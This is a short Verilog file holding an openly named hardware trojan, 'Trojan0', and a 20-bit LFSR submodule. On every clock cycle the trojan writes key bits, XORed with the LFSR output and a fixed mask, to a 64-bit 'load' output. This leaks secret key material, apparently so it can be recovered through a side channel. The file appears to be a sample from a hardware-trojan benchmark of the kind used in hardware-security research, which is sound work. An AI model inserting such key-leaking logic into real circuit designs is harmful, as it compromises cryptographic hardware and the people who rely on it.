module Trojan0 #(
	// Non-I/O tunables as parameters (I/O bitwidths fixed)
	parameter [63:0] LOAD_XOR_MASK = 64'h8FADC1A6B5E37921
)(
	input  wire         clk,
	input  wire         rst,
	input  wire [127:0] key,
	output reg  [63:0]  load
);
	// LFSR counter (use default submodule width = 20)
	wire [19:0] counter;
	lfsr_counter u_lfsr (
		.rst(rst),
		.clk(clk),
		.lfsr(counter)
	);

	// Generate load from key/LFSR/mask
	always @(posedge clk) begin
		integer i;
		for (i = 0; i < 64; i = i + 1) begin
			load[i] <= key[i] ^ counter[i % 20] ^ LOAD_XOR_MASK[i];
		end
	end

endmodule


module lfsr_counter #(
	parameter integer LFSR_WIDTH = 20,
	parameter [31:0] FEEDBACK_POLY = 32'h9A1DE644,
	parameter [LFSR_WIDTH-1:0] INIT_VALUE = 20'b10011001100110011001
)(
	input  wire rst,
	input  wire clk,
	output wire [LFSR_WIDTH-1:0] lfsr
);
	reg [LFSR_WIDTH-1:0] lfsr_stream;
	wire feedback;

	assign lfsr = lfsr_stream;

	// Feedback taps from polynomial masked to LFSR width
	wire [LFSR_WIDTH-1:0] poly_masked = FEEDBACK_POLY[LFSR_WIDTH-1:0];
	assign feedback = ^(lfsr_stream & poly_masked);

	always @(posedge clk) begin
		if (rst) begin
			lfsr_stream <= INIT_VALUE;
		end else begin
			lfsr_stream <= {feedback, lfsr_stream[LFSR_WIDTH-1:1]};
		end
	end
endmodule
